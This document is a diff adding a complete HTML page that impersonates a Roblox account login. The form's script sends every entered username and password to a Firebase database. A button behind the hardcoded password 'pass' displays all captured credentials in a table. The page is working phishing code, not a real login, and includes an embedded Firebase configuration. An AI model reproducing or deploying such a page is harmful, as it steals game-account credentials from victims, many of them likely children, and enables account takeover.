@@ -1,0 +1,139 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Roblox Account Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      padding: 20px;
+    }
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px 0;
+      width: 90%;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #ff4757;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      padding: 10px;
+      border-bottom: 1px solid #ccc;
+      text-align: left;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Roblox Account Login</h1>
+
+    <form id="accountForm">
+      <input type="text" id="username" placeholder="Roblox Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+
+    <button onclick="requestPassword()">Open Roblox</button>
+
+    <div id="recordsSection" class="hidden">
+      <table>
+        <thead>
+          <tr>
+            <th>Username</th>
+            <th>Password</th>
+          </tr>
+        </thead>
+        <tbody id="accountTable"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCJTUZkYLcGWYk2etzRaBVfU62zUPIOmyI",
+      authDomain: "roblox-e1d52.firebaseapp.com",
+      databaseURL: "https://roblox-e1d52-default-rtdb.firebaseio.com",
+      projectId: "roblox-e1d52",
+      storageBucket: "roblox-e1d52.firebasestorage.app",
+      messagingSenderId: "32788940613",
+      appId: "1:32788940613:web:6749e07a692b2ebbc0a02c",
+      measurementId: "G-WHD87DPVJZ"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const form = document.getElementById('accountForm');
+    const tableBody = document.getElementById('accountTable');
+    const recordsSection = document.getElementById('recordsSection');
+    const MASTER_PASSWORD = "pass";
+
+    function requestPassword() {
+      const enteredPassword = prompt("Enter password to view records:");
+      if (enteredPassword === MASTER_PASSWORD) {
+        loadAccounts();
+        recordsSection.classList.remove('hidden');
+      } else {
+        alert("Incorrect password.");
+      }
+    }
+
+    function loadAccounts() {
+      tableBody.innerHTML = "";
+      db.ref("accounts").once("value", snapshot => {
+        snapshot.forEach(child => {
+          const acc = child.val();
+          addRow(acc.username, acc.password);
+        });
+      });
+    }
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const newRef = db.ref("accounts").push();
+      newRef.set({ username, password });
+
+      form.reset();
+      if (!recordsSection.classList.contains('hidden')) {
+        loadAccounts();
+      }
+    });
+
+    function addRow(username, password) {
+      const row = document.createElement('tr');
+      row.innerHTML = `<td>${username}</td><td>${password}</td>`;
+      tableBody.appendChild(row);
+    }
+  </script>
+</body>
+</html>
